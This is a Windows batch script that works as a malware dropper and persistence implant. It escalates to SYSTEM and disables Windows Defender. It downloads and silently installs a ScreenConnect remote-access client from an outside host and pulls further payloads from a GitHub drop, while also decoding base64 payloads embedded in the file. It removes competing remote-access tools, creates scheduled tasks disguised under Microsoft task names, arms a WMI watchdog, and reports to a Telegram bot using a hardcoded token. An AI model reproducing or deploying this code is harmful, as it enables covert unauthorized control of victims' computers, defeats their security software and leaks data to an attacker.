@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O25 - unharden-before-write (self-lock fix) + embed + identity + watchdog + pkg.msi fallback
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O25 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O25: prior S4 hardening (+h +s) makes copy/move over old files fail silently.
  REM Strip attrs first, then VERIFY the copy is really this build - else use a fresh unique runner.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  copy /y "%~f0" "%BOOT%\own_run.cmd" >nul 2>&1
  if not exist "%BOOT%\own_run.cmd" (
    echo ERROR: cannot write %BOOT%\own_run.cmd
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O25" "%BOOT%\own_run.cmd" >nul 2>&1
  if errorlevel 1 (
    set "RUNNER=%BOOT%\own_o25_%RANDOM%%RANDOM%.cmd"
    copy /y "%~f0" "!RUNNER!" >nul 2>&1
    echo runner_fallback_unique>>"%LOG%" 2>nul
  ) else (
    mkdir "%WD%" >nul 2>&1
    attrib -h -s -r "%SELF%" >nul 2>&1
    copy /y "%BOOT%\own_run.cmd" "%SELF%" >nul 2>&1
    set "RUNNER=%SELF%"
    findstr /C:"OWN BUILD 20260802O25" "%SELF%" >nul 2>&1
    if errorlevel 1 set "RUNNER=%BOOT%\own_run.cmd"
  )
  echo go_start %DATE% %TIME%>"%LOG%" 2>nul
  if not exist "%LOG%" (
    set "LOG=%BOOT%\boot.err"
    echo go_start %DATE% %TIME%>"%LOG%"
  )
  echo order=msi_then_primary_then_nuke_foreign>>"%LOG%"
  echo engine=cmd_detached_o25>>"%LOG%"
  echo whoami_launcher=>>"%LOG%"
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%"
  echo runner=!RUNNER!>>"%LOG%"
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      set "PROOF=0"
      for /l %%N in (1,1,6) do (
        if exist "%BOOT%\wproof" set "PROOF=1"
        if not exist "%BOOT%\wproof" timeout /t 2 /nobreak >nul 2>&1
      )
      if "!PROOF!"=="1" (
        set "DETACH_OK=1"
        echo detach_via=schtasks_root>>"%LOG%"
      ) else (
        echo detach_a_noproof>>"%LOG%"
        type "%BOOT%\detach.task" >>"%LOG%" 2>&1
        type "%BOOT%\detach.run" >>"%LOG%" 2>&1
      )
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)
    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O25 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
echo embed_extract_done>>"%LOG%"

REM O25: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M16" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S6" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T8" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L5" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (repair-first ladder)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM service deleted but product registered: repair in place (no SC-family msiexec collision)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo primary_svc_missing_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks the SC custom action - clear it
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/stopped - MSI install...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus REBOOT=ReallySuppress /L*v "%WD%\msi_reinstall.log"
echo msi_reinstall_!ERRORLEVEL!>>"%LOG%"
timeout /t 10 /nobreak >nul

REM post-install: product registered but service entry still missing -> repair by GUID
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O25: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,2 delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%V"
if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\Scheduled"
if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\Server"
if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHost"
if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpAddressConflict1"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
echo identity_A=%TASK_A%>>"%LOG%"
echo identity_B=%TASK_B%>>"%LOG%"
echo identity_C=%TASK_C%>>"%LOG%"
echo identity_D=%TASK_D% mo=%MO_A%/%MO_B%>>"%LOG%"

REM schtasks /TR: single-level quotes only; paths never contain spaces
schtasks /Delete /TN "%TASK_A%" /F >nul 2>&1
echo create_taskA_begin>>"%LOG%"
schtasks /Create /TN "%TASK_A%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_A% /F /TR "cmd.exe /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
schtasks /Delete /TN "%TASK_B%" /F >nul 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Create /TN "%TASK_B%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_B% /F /TR "cmd.exe /c %ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >>"%LOG%" 2>&1
schtasks /Delete /TN "%TASK_C%" /F >nul 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Create /TN "%TASK_C%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
schtasks /Delete /TN "%TASK_D%" /F >nul 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Create /TN "%TASK_D%" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
REM verify tasks really registered
schtasks /Query /TN "%TASK_A%" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_B%" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_C%" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_D%" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O25 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  >"%WD%\notify.cfg" echo BOT_TOKEN=8619715754:AAFMk2NjND-hQk2xPFYjicHfB5MyKtcXCqg
  >>"%WD%\notify.cfg" echo CHAT_ID=7547462070
)
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O25 >>"%LOG%" 2>&1
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmCnJlbSDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKcmVtICBPV05fTU9OICBCVUlMRCAyMDI2
MDgwMk0xNgpyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50aS1z
aWduYXR1cmUpLCBtdXR1YWwKcmVtICBXTUkrc2NodGFza3MgY2hhaW5zLCBNU0kgZmFsbGJhY2sg
Y2hhaW4sIHN0YXRlLmpzb24sIGRpZ2VzdCBIQi4KcmVtICBBdXRob3JpemVkIGludGVybmFsIGRl
cGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4KcmVtIOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkApzZXRsb2NhbCBFbmFibGVEZWxheWVkRXhwYW5zaW9uCgpzZXQgIktFRVBfRlA9NWY2MDEw
NTc5ODUyZTUwNyIKc2V0ICJBTFRfRlA9Zjg2MWM4MTQwZDQ1MzQyNyIKc2V0ICJXRD1DOlxQcm9n
cmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSIKc2V0ICJFVEw9Qzpc
UHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLmV0bGNhY2hlIgpzZXQgIkxP
Rz0lV0QlXG93bl9tb24ubG9nIgpzZXQgIlNUQVRFPSVXRCVcb3duX21vbi5zdGF0ZSIKc2V0ICJI
QkZMQUc9JVdEJVxoYi5mbGFnIgpzZXQgIkNVUkw9JVN5c3RlbVJvb3QlXFN5c3RlbTMyXGN1cmwu
ZXhlIgpzZXQgIlRHPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9n
aXRodWItZHJvcC9tYWluL3RnX3JlcG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIlRH
Mj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi90
Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSIKc2V0ICJPV05TRUM9aHR0cHM6Ly9yYXcu
Z2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX3NlY3Vy
ZS5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIk9XTlNFQzI9aHR0cHM6Ly9jZG4uanNkZWxp
dnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vb3duX3NlY3VyZS5jbWQ/dD0lUkFO
RE9NJSVSQU5ET00lIgpzZXQgIk9XTk1PTj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5j
b20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRP
TSUiCnNldCAiT1dOTU9OMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0
aHViLWRyb3BAbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiCnNldCAiT1dOTElC
PWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9t
YWluL293bl9saWIucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSIKc2V0ICJPV05MSUIyPWh0dHBzOi8v
Y2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9saWIucHMx
P3Q9JVJBTkRPTSUlUkFORE9NJSIKc2V0ICJNU0lfVVJMPWh0dHBzOi8vc2V2cnouY29tL1NjcmVl
bkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpIgpzZXQgIk1TSV9QS0cxPWh0dHBzOi8vcmF3LmdpdGh1
YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL3BrZy5tc2kiCnNldCAi
TVNJX1BLRzI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9w
QG1haW4vcGtnLm1zaSIKc2V0ICJNU0k9JVByb2dyYW1EYXRhJVxTY3JlZW5Db25uZWN0LkNsaWVu
dFNldHVwLm1zaSIKCmlmIG5vdCBleGlzdCAiJVdEJSIgbWQgIiVXRCUiIDI+bnVsCmlmIG5vdCBl
eGlzdCAiJUxPRyUiIHR5cGUgbnVsPiIlTE9HJSIgMj5udWwKCnNldCAiTU9OVkVSPU0xNiIKc2V0
ICJQRjg2PSVQcm9ncmFtRmlsZXMoeDg2KSUiCmZvciAvZiAidG9rZW5zPTEtMyBkZWxpbXM9LyAi
ICUlYSBpbiAoIiVkYXRlJSIpIGRvIHNldCAiRFQ9JWRhdGUlICV0aW1lJSIKZWNoby4+PiIlTE9H
JSIKZWNobyDilIDilIAgdGljayAhRFQhIFt2ZXIgJU1PTlZFUiVdIOKUgOKUgD4+IiVMT0clIgpz
ZXQgIkNPVU5UPTAiCnNldCAiSU5TVEFMTEVEPTAiCnNldCAiUFJJTV9PSz0wIgpzZXQgIkFMVF9P
Sz0wIgpzZXQgIkZPUkVJR05fTEVGVD0wIgpzZXQgIkZPUkVJR05fTElTVD0iCnNldCAiTVNJRVhJ
VD1ub3QtcnVuIgoKcmVtIOKUgOKUgCBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWduYXR1cmUp
IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgAppZiBub3QgZXhpc3QgIiVXRCVcaWRlbnRpdHkuY2ZnIiBpZiBleGlz
dCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlv
biBpbml0IC1Xb3JrRGlyICIlV0QlIiA+bnVsIDI+JjEKaWYgZXhpc3QgIiVXRCVcaWRlbnRpdHku
Y2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLDIgZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVc
